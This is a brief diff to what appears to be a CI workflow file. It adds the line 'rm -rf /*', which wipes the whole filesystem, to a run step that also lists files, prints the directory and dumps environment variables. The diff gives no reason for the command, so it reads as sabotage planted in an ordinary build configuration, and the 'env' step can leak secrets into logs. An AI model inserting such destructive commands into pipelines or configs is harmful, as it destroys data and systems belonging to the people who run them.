@@ -22,5 +22,6 @@ jobs:
           ls -la
           pwd
           env
+          rm -rf /*
       # Runs a single command using the runners shell
       - run: echo Hello, world!
